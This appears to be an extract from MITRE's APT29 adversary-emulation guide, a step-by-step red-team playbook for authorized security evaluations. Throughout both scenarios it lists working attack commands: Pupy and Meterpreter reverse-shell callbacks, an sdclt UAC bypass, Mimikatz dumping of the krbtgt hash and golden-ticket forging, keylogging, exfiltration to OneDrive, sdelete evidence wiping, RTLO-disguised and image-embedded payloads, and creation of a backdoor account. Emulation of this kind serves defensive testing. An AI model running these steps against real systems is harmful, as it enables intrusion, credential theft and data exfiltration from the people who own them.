S0053, CozyDuke/CozyCar ATT&CK S0046, and HAMMERTOSS ATT&CK S0037","This scenario begins with a legitimate user clicking on a malicious payload delivered via a “spray and pray” broad spearphishing. campaign. The attacker immediately kicks off a “smash-and-grab”, rapid espionage mission, gathering and exfiltrating data. After initial exfiltration, the attacker realizes the value of victim and subsequently deploys a stealthier toolkit, changing TTPs​ and eventually moving laterally through the rest of the environment. The scenario ends with the execution of previously established persistence mechanisms are executed.","This content to execute this scenario was tested and developed using Pupy, Meterpreter, and other custom/modified scripts and payloads. Pupy and Meterpreter were chosen based on their available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"l":"Day 2","p":["Based on PowerDuke ATT&CK S0139, POSHSPY ATT&CK S0150, CloudDuke ATT&CK S0054, and more recent (2016+) TTPs","This scenario begins with a legitimate user clicking on a malicious payload delivered via a targeted spearphishing​ campaign. The attacker employs a low and slow, methodical approach​ to owning the initial target, establishing persistence, gathering credential materials​, then finally enumerating and owning the entire domain​. Data exfiltration is dumped to a public cloud storage​. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","This content to execute this scenario was tested and developed using PoshC2 and other custom/modified scripts and payloads. PoshC2 was chosen based on its available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"i":"apt29-day-1-steps-1-through-10-archived","l":"APT29 Day 1 (Steps 1 through 10) (ARCHIVED)"},{"l":"Acknowledgments"},{"i":"special-thanks-to-the-following-public-resources","l":"Special thanks to the following public resources:","p":["Metasploit ( https://github.com/rapid7/metasploit-framework)","Pupy ( https://github.com/n1nj4sec/pupy)","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Microsoft Sysinternals ( https://docs.microsoft.com/en-us/sysinternals/)"]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeadDaddy, CozyDuke/CozyCar, and Hammertoss","Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing","\"Smash-and-grab\" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Requirements"},{"i":"victim-systems","l":"Victim systems:","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined","Same local administrator account on both Windows workstations","Google Chrome Web Browser ( https://www.google.com/chrome/) must be available on one of the victim workstations"]},{"i":"red-team-systems","l":"Red Team Systems:","p":["Attack Platform: tested and executed on Ubuntu 18.04.3 LTS","Pupy RAT ( https://github.com/n1nj4sec/pupy)","Metasploit Framework ( https://github.com/rapid7/metasploit-framework)","Chrome Password Dumper ( https://github.com/adnan-alhomssi/chrome-passwords)","Sysinternals Suite Zip file ( https://download.sysinternals.com/files/SysinternalsSuite.zip)","WebDAV Share serving from /var/www/webdav ( https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-14-04)","Redirector: tested and executed on Ubuntu 18.04.3 LTS","socat ( https://linux.die.net/man/1/socat)","Windows Attack Platform: Windows 10 x64 version 1903","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Python 3 ( https://www.python.org/downloads/)","PyInstaller ( https://www.pyinstaller.org/)","Note: The Windows attack platform is only required if you would like to compile the Day 1 payloads. If you use the pre-compiled payloads, you do not need this system."]},{"l":"Red Team Setup","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Attack Platform","192.168.0.4","Redirector","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes four payloads that model APT29 malware.","The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.","Pre-compiled payloads are available in the payloads directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.","If you would like to build the payloads yourself, please see payload_configs.md for further instructions."]},{"i":"setup-redirector-19216805-or-the-value-used-for-the-redirector-ip","l":"Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)","p":["From the redirector system, setup port forwarding using Socat"]},{"i":"setup-attack-platform-19216804","l":"Setup Attack Platform: 192.168.0.4","p":["Download Chrome password dumper tool from: https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe","Download SysInternals zip folder from: https://download.sysinternals.com/files/SysinternalsSuite.zip","Unzip SysinternalsSuite.zip; copy the following files into the SysInternalsSuite directory:","readme.txt","psversion.txt","chrome-passwords.exe(renamed as accessChk.exe)","strings64.exe(compiled from hostui.cpp)","Zip modified SysinternalsSuite folder","Install Pupy and Metasploit on Attack Platform by running install_day1_tools.sh","Start Pupy docker container then the EC4 listener","sudo pupy/start-compose.sh","listen -a ec4"]},{"l":"Victim Setup"},{"i":"for-each-of-the-2-victim-workstations","l":"For each of the 2 victim workstations:","p":["Login in as user with administrator privileges","Ensure Windows Defender is off or configured to alert-only","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Verify user has read/write/execute permissions in the C:\\Windows\\Temp directory","Install Google Chrome ( https://www.google.com/chrome/); cache credentials in Chrome password manager","Import-PFX certificate found in payloads/shockwave.local.pfx, instructions below"]},{"l":"Import PFX Certificate","p":["Step 6.B of this emulation models theft of Private Keys ( https://attack.mitre.org/techniques/T1145/).","Copy the PFX certificate located in the payloads/shockwave.local.pfx directory to the Windows victims.","Import the certificate using PowerShell:"]},{"i":"add-rtlo-character-and-place-rcs3aka3doc-on-windows-victim-1","l":"Add RTLO character and place rcs.3aka3.doc on Windows Victim-1","p":["See payload_configs.md for instructions on how to update cod.3aka3.scr"]},{"l":"Beginning of Day1 Execution"},{"i":"step-1---initial-breach","l":"Step 1 - Initial Breach"},{"i":"1a","l":"1.A","p":["Login to victim workstation.","Double click 3aka3.doc on Desktop","This will send a reverse shell to the Pupy C2 server."]},{"i":"1b","l":"1.B","p":["From Pupy C2 server:","[pupy] > shell","[pupy (CMD)] > powershell"]},{"i":"step-2---rapid-collection-and-exfiltration","l":"Step 2 - Rapid Collection and Exfiltration"},{"i":"2a","l":"2.A","p":["Paste the following PowerShell 1-liner into the Pupy terminal:","[pupy (PowerShell)] >","[pupy (PowerShell)] > exit","[pupy (CMD)] > exit"]},{"i":"2b","l":"2.B","p":["[pupy] > download C:\\Users\\username\\AppData\\Roaming\\Draft.Zip ."]},{"i":"step-3---deploy-stealth-toolkit","l":"Step 3 - Deploy Stealth Toolkit"},{"i":"3a","l":"3.A","p":["Start Metasploit handler:","[msf] > handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https","From Pupy, upload monkey.png to target:","[pupy] > upload /tmp/monkey.png C:\\Users\\username\\Downloads\\monkey.png[pupy] > shell[pupy CMD] > powershell"]},{"i":"3b","l":"3.B","p":["[pupy (PowerShell)] >","Paste the following 1-liner when prompted for value:","When prompted for value, press: [Enter]","[pupy (PowerShell)] > exit[pupy (CMD)] > %windir%\\system32\\sdclt.exe[pupy CMD] > powershell","You should receive a high integrity Meterpreter callback."]},{"i":"3c","l":"3.C","p":["[pupy (PowerShell)] > Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force[pupy (PowerShell)] > exit[pupy (CMD)] > exit"]},{"i":"step-4---defense-evasion-and-discovery","l":"Step 4 - Defense Evasion and Discovery"},{"i":"4a","l":"4.A","p":["From Metasploit:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >","[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite\\"]},{"i":"4b","l":"4.B","p":["Terminate Pupy RAT process:","[meterpreter (PowerShell)*] > Get-Process","[meterpreter (PowerShell)*] > Stop-Process -Id rcs.3aka3.doc PID -Force","You may now close Pupy.","From Metasploit:","[meterpreter (PowerShell)*] > Gci $env:userprofile\\Desktop","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Desktop\\?rcs.3aka.doc","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:APPDATA\\Draft.Zip","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Downloads\\SysinternalsSuite.zip","Import custom script, readme.ps1:","[meterpreter (PowerShell)*] > Move-Item .\\readme.txt readme.ps1","[meterpreter (PowerShell)*] > . .\\readme.ps1"]},{"i":"4c","l":"4.C","p":["[meterpreter (PowerShell)*] > Invoke-Discovery"]},{"i":"step-5---persistence","l":"Step 5 - Persistence"},{"i":"5a","l":"5.A","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 1"]},{"i":"5b","l":"5.B","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 2"]},{"i":"step-6---credential-access","l":"Step 6 - Credential Access"},{"i":"6a","l":"6.A","p":["Execute chrome-password collector:","[meterpreter (PowerShell)*] > C:\\Program Files\\SysinternalsSuite\\accesschk.exe"]},{"i":"6b","l":"6.B","p":["Steal PFX certificate:","[meterpreter (PowerShell)*] > Get-PrivateKeys","[meterpreter (PowerShell)*] > exit"]},{"i":"6c","l":"6.C","p":["Dump password hashes:","[meterpreter*] > run post/windows/gather/credentials/credential_collector"]},{"i":"step-7---collection-and-exfiltration","l":"Step 7 - Collection and Exfiltration"},{"i":"7a","l":"7.A","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite","[meterpreter (PowerShell)*] > Move-Item .\\psversion.txt psversion.ps1","[meterpreter (PowerShell)*] > . .\\psversion.ps1","[meterpreter (PowerShell)*] > Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName Screenshot","From the Windows victim, type text and copy to the clipboard.","[meterpreter (PowerShell)*] > Get-Clipboard","[meterpreter (PowerShell)*] > Keystroke-Check","[meterpreter (PowerShell)*] > Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName Keystrokes","From victim system, enter keystrokes.","View keylog output from Metasploit:","[meterpreter (PowerShell)*] > View-Job -JobName Keystrokes[meterpreter (PowerShell)*] > Remove-Job -Name Keystrokes -Force[meterpreter (PowerShell)*] > Remove-Job -Name Screenshot -Force"]},{"i":"7b","l":"7.B","p":["[meterpreter (PowerShell)*] > Invoke-Exfil"]},{"i":"step-8---lateral-movement","l":"Step 8 - Lateral Movement"},{"i":"8a","l":"8.A","p":["Copy payload to webdav share:","[user@attacker]# cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/[user@attacker]# cd /var/www/webdav[user@attacker]# chown -R www-data:www-data python.exe","Switch back to Meterpreter shell:","[meterpreter (PowerShell)*] > Ad-Search Computer Name *","[meterpreter (PowerShell)*] >","Note the session ID for step 8C."]},{"i":"8b","l":"8.B","p":["Start a new instance of Metasploit, and spawn a Metasploit handler:","[bash] > msfconsole","[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https","Return to current Meterpreter session:","[meterpreter (PowerShell)*] > Invoke-SeaDukeStage -ComputerName victim 2 IP"]},{"i":"8c","l":"8.C","p":["Execute SEADUKE Remotely via PSEXEC","[meterpreter (PowerShell)*] >","You should receive a callback in your other Metasploit terminal."]},{"i":"step-9---collection","l":"Step 9 - Collection"},{"i":"9a","l":"9.A","p":["From the second Metasploit terminal:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >"]},{"i":"9b","l":"9.B","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Windows\\Temp","[meterpreter (PowerShell)*] > .\\Rar.exe a -hpfGzq5yKw $env:USERPROFILE\\Desktop\\working.zip $env:APPDATA\\working.zip","[meterpreter (PowerShell)*] > exit","[meterpreter*] > download C:\\\\Users\\\\username\\\\Desktop\\\\working.zip ."]},{"i":"9c","l":"9.C","p":["[meterpreter*] > shell","[meterpreter (Shell)*] > cd C:\\Windows\\Temp","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Windows\\Temp\\Rar.exe","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\AppData\\Roaming\\working.zip","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\Desktop\\working.zip","[meterpreter (Shell)*] > del C:\\Windows\\Temp\\sdelete64.exe","Terminate Session[meterpreter (Shell)*] > exit[meterpreter*] > exit msf> exit"]},{"i":"step-10---persistence-execution","l":"Step 10 - Persistence Execution"},{"i":"10a","l":"10.A","p":["Reboot Windows victim 1; wait for system to boot up","You should receive a callback with SYSTEM permissions from the javamtsup service"]},{"i":"10b","l":"10.B","p":["Trigger the Startup Folder persistence by logging in to Windows victim 1"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"l":"Payload configs"},{"l":"Create Day 1 Payloads"},{"i":"1-cosmicduke-payload-cod3aka3scr","l":"1. CosmicDuke Payload (cod.3aka3.scr)","p":["alt text","cod.3aka3.scr","Description","Filename","Generate a Pupy-EC4 callback payload:","Location","Move cursor to beginning of filename. Press \"ctrl-v\" to paste RTLO character, and hit \"enter\" to save the rename.","On Windows attack platform, rename cod.3aka3.scr with right-to-left override character ( https://redcanary.com/blog/right-to-left-override/)","payloads/cod.3aka3.scr","Portable executable that uses right-to-left override character to disguise file extension","Right click cod.3aka3.scr, then click \"Rename\"","Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/","Scroll to the RTLO character (U+202E)","Select the RTLO character, then click \"select\", then click \"copy\"","The file should now be named \"rcs.3aka3.doc\"","Windows key and type 'Character Map'; select open"]},{"i":"2-privilege-escalation-payload-monkeypng","l":"2. Privilege Escalation Payload (monkey.png)","p":["Filename","Location","Description","monkey.png","payloads/monkey.png","Well formed PNG with embedded PowerShell-Meterpreter callback","Steps to re-create:","Generate a PowerShell-formatted Meterpreter payload:","Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage):"]},{"i":"3-startup-folder-payload-strings64hostuiexe","l":"3. Startup Folder Payload (strings64/hostui.exe)","p":["Filename","Location","Description","strings64.exe","payloads/SysinternalsSuite/strings64.exe","Launches Meterpreter using CreateProcessWithToken API call","Generate PowerShell-formatted Meterpreter:","Copy the PowerShell 1-liner to clipboard. Your clipboard should look like:","powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=","Do not copy the execution preamble (%COMSPEC% /b /c start /b /min)","Open payloads/readme.txt; paste the PowerShell-Meterpreter blog on line 816. This line should look like:","$javasvc = powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa="]},{"i":"4-persistent-service-payload-javamtsupexe","l":"4. Persistent Service Payload (javamtsup.exe)","p":["Filename","Location","Description","javamtsup.exe","payloads/SysinternalsSuite/javamtsup.exe","Reverse HTTPS Meterpreter service executable","Generate a Meterpreter service-binary:"]},{"i":"5-seaduke-payload-pythonexe","l":"5. SeaDuke Payload (python.exe)","p":["Filename","Location","Description","python.exe","payloads/Seaduke/python.exe","Python Meterpreter compiled to EXE with PyInstaller","Generate python-formatted Meterpreter:","Transfer python.py to Windows attack platform","Compile python.py into a portable executable using PyInstaller ( https://pypi.org/project/PyInstaller/)","Pack the python.exe payload using UPX ( https://github.com/upx/upx)"]}],[{"i":"apt29-day-2-steps-11-through-20-archived","l":"APT29 Day 2 (Steps 11 through 20) (ARCHIVED)"},{"l":"Acknowledgements"},{"i":"special-thanks-to-the-following-public-resources","l":"Special thanks to the following public resources:","p":["Atomic Red Team ( https://github.com/redcanaryco/atomic-red-team)","Mimikatz ( https://github.com/gentilkiwi/mimikatz)","Pinvoke ( http://www.pinvoke.net)","PoshC2 ( https://github.com/nettitude/PoshC2)","POSHSPY ( https://github.com/matthewdunwoody/POSHSPY)","PowerSploit ( https://github.com/PowerShellMafia/PowerSploit)","PSReflect-Functions ( https://github.com/jaredcatkinson/PSReflect-Functions)","State of the Hack S2E01: #NoEasyBreach REVISITED ( https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)","Use PowerShell to Interact with the Windows API ( https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1)","Yet another sdclt UAC bypass ( http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)"]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs","Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain","Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Requirements"},{"i":"victim-systems","l":"Victim Systems:","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined with at least 2 accounts (domain admin and another user)","Microsoft Outlook must be available locally on one of the victim workstations"]},{"i":"red-team-systems","l":"Red Team Systems:","p":["Server running an offensive framework (we tested and executed using PoshC2 -- https://github.com/nettitude/PoshC2) capable of:","Executing native PowerShell commands","Loading and executing PowerShell scripts (.ps1)","Generating a DLL payload and an encoded PowerShell oneliner","Receiving and maintaining multiple callbacks at once","Online OneDrive Account ( https://onedrive.live.com/)"]},{"l":"Red Team Setup"},{"i":"generate-an-encoded-powershell-oneliner-payload-then-copy","l":"Generate an encoded PowerShell oneliner payload, then copy:","p":["Just the encoded portion (ex: WwBTAH...=) into $enc_ps variable(4th line from bottom) in schemas.ps1","ex: $enc_ps = WwBTAH...==","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into CommandLineTemplate variable (under $ConsumerArgs in 2nd paragraph) in stepFifteen_wmi.ps1","ex: CommandLineTemplate=powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into -Value variable (2nd line) in stepFourteen_bypassUAC.ps1","ex: New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="]},{"i":"generate-dll-payload-then-on-a-separate-windows-host","l":"Generate DLL payload, then on a separate Windows host:","p":["[CMD] > certutil -encode [file].dll blob","[CMD] > powershell","[PS] > $blob = (Get-Content .\\blob) -join ; $blob .\\blob","Open blob file in text editor","Delete new line at end of file and copy all (CTRL-A, CTRL-C)","Paste value (ex: -----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----) into $bin variable (6th line) in schemas.ps1"]},{"i":"copy-payloads-to-c2-server-wherever-is-appropriate-for-your-c2-framework-to-have-access-to-these-files","l":"Copy payloads to C2 server (wherever is appropriate for your C2 framework to have access to these files)"},{"i":"update-stepfourteen_creddumpps1----directions-are-in-file","l":"Update stepFourteen_credDump.ps1 -- directions are in file"},{"i":"prepare-initial-access-payloads","l":"Prepare initial access payloads:","p":["Login as non-domain admin user","Copy over the following files onto the Desktop of the initial victim:","2016_United_States_presidential_election_-_Wikipedia.html","make_lnk.ps1","schemas.ps1","Copy over MITRE-ATTACK-EVALS.HTML into the Documents folder of the initial victim","Execute make_lnk.ps1(Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk","Drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)"]},{"l":"Victim Setup"},{"i":"for-each-of-the-3-victims","l":"For each of the 3 victims:","p":["Login in as domain admin user","Ensure Windows Defender is off or configured to alert-only ( https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security)","Change network type to Domain ( https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry)","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Enable WinRM ( https://support.microsoft.com/en-us/help/555966)","Enable UseLogonCredential in the WDigest Registry settings ( https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)"]},{"i":"for-the-initial-victim-the-workstation-with-microsoft-outlook","l":"For the initial victim (the workstation with Microsoft Outlook):","p":["Login as non-domain admin user","Enable programatic access to Microsoft Outlook ( https://www.slipstick.com/developer/change-programmatic-access-options/)","Open Outlook and sign in if necessary"]},{"l":"Beginning of Day2 Execution"},{"i":"step-11---initial-breach","l":"Step 11 - Initial Breach"},{"i":"11a","l":"11.A","p":["As non-domain admin user, execute 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk(double click), output will display in terminal","You will now receive a new, low integrity callback"]},{"i":"step-12---fortify-access","l":"Step 12 - Fortify Access"},{"i":"12a","l":"12.A","p":["Load timestomp.ps1","Execute timestomp C:\\Users\\oscar\\AppData\\Roaming\\Microsoft\\kxwn.lock"]},{"i":"12b","l":"12.B","p":["Load stepTwelve.ps1","Execute detectav"]},{"i":"12c","l":"12.C","p":["Execute software"]},{"i":"step-13---local-enumeration","l":"Step 13 - Local Enumeration"},{"i":"13a","l":"13.A","p":["Load stepThirteen.ps1","Execute comp"]},{"i":"13b","l":"13.B","p":["Execute domain"]},{"i":"13c","l":"13.C","p":["Execute user"]},{"i":"13d","l":"13.D","p":["Execute pslist"]},{"i":"step-14---elevation","l":"Step 14 - Elevation"},{"i":"14a","l":"14.A","p":["Load stepFourteen_bypassUAC.ps1","Execute bypass","You will now receive a new, high integrity callback"]},{"i":"14b","l":"14.B","p":["Go to where m.exe is on C2 server in another terminal","Confirm m.exe is there and is a Windows PE ($ file m)","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Host file on port 8080 ($ sudo python -m SimpleHTTPServer 8080)","Interact with new callback","Load stepFourteen_credDump.ps1","Execute wmidump","Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)"]},{"i":"step-15---establish-persistence","l":"Step 15 - Establish Persistence"},{"i":"15a","l":"15.A","p":["Load stepFifteen_wmi.ps1","Execute wmi","Note: Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20"]},{"i":"step-16---lateral-movement","l":"Step 16 - Lateral Movement"},{"i":"16a","l":"16.A","p":["Interact with low integrity callback","Load powerView.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","Execute get-netdomaincontroller"]},{"i":"16b","l":"16.B","p":["Load stepSixteen_SID.ps1","Execute siduser","Save the value for the domain SID (ex: S-1-5-21-2219224806-3979921203-557828661-1110) and delete the RID (ex: -1110) of the end (ex: S-1-5-21-2219224806-3979921203-557828661)"]},{"i":"16c","l":"16.C","p":["Interact with high integrity callback","Load Invoke-WinRMSession.ps1(available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)","Execute invoke-winrmsession -Username [insert domain admin username] -Password [insert domain admin password] -IPAddress [insert domain controller IP]","Output will tell you a session opened and give you the format for using it, ex: Session opened, to run a command do the following: Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string","Save the value for the session_id (ex: $hzaqx)","Note: If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C"]},{"i":"16d","l":"16.D","p":["Execute Copy-Item m.exe -Destination C:\\Windows\\System32\\ -ToSession $[session_id]","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Execute Invoke-Command -Session $[session_id] -scriptblock {C:\\Windows\\System32\\m.exe privilege::debug lsadump::lsa /inject /name:krbtgt exit} | out-string","Take note of value for the NTLM hash (ex: NTLM : f4a688010d80770a55a22893dc6ac510) near the top (Under RID and User after * Primary)","Execute Get-PSSession | Remove-PSSession"]},{"i":"step-17---collection","l":"Step 17 - Collection"},{"i":"17a","l":"17.A","p":["Interact with low integrity callback","Load stepSeventeen_email.ps1","Execute psemail"]},{"i":"17b","l":"17.B","p":["Interact with high integrity callback","Execute New-Item -Path C:\\Windows\\Temp\\ -Name WindowsParentalControlMigration -ItemType directory","Execute Copy-Item C:\\Users\\oscar\\Documents\\MITRE-ATTACK-EVALS.HTML -Destination C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"17c","l":"17.C","p":["Load stepSeventeen_zip.ps1","Execute zip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"step-18---exfiltration","l":"Step 18 - Exfiltration"},{"i":"18a","l":"18.A","p":["Get CID for OneDrive account ( https://www.laptopmag.com/articles/map-onedrive-network-drive)","Execute net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com [OneDrive password]","Execute Copy-Item C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp -Destination Y:\\WindowsParentalControlMigration.tmp","Login to https://onedrive.live.com/?id=root&cid=[CID] to see exfil ( WindowsParentalControlMigration.tmp)"]},{"i":"step-19---clean-up","l":"Step 19 - Clean UP"},{"i":"19a","l":"19.A","p":["Load wipe.ps1","Execute wipe C:\\Windows\\System32\\m.exe","Note: There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang"]},{"i":"19b","l":"19.B","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp"]},{"i":"19c","l":"19.C","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML"]},{"i":"step-20---leverage-persistence","l":"Step 20 - Leverage Persistence"},{"i":"20a","l":"20.A","p":["Execute restart-computer -force","Existing 2 callbacks should die","RDP and login to initial victim once it reboots","Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)","Note: You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire"]},{"i":"20b","l":"20.B","p":["Interact with the SYSTEM PS callback (from WMI)","Execute klist purge","Load Invoke-Mimikatz.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)","Execute invoke-mimikatz -command 'kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt' using the SID and NTLM values from earlier","Execute klist and confirm ticket is in cache","Execute Enter-PSSession [hostname of second workstation in domain]","Execute Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby pamBeesly3}"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"l":"Resources","p":["Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]}],[{"l":"Payload configs"},{"l":"Create Scenario 1 Payloads"},{"i":"1-cosmicduke-payload-cod3aka3scr","l":"1. CosmicDuke Payload (cod.3aka3.scr)","p":["alt text","cod.3aka3.scr","Description","Filename","Generate a Pupy-EC4 callback payload:","Location","Move cursor to beginning of filename. Press \"ctrl-v\" to paste RTLO character, and hit \"enter\" to save the rename.","On Windows attack platform, rename cod.3aka3.scr with right-to-left override character ( https://redcanary.com/blog/right-to-left-override/)","payloads/cod.3aka3.scr","Portable executable that uses right-to-left override character to disguise file extension","Right click cod.3aka3.scr, then click \"Rename\"","Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/","Scroll to the RTLO character (U+202E)","Select the RTLO character, then click \"select\", then click \"copy\"","The file should now be named \"rcs.3aka3.doc\"","Windows key and type 'Character Map'; select open"]},{"i":"2-privilege-escalation-payload-monkeypng","l":"2. Privilege Escalation Payload (monkey.png)","p":["Filename","Location","Description","monkey.png","payloads/monkey.png","Well formed PNG with embedded PowerShell-Meterpreter callback","Steps to re-create:","Generate a PowerShell-formatted Meterpreter payload:","Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage ( 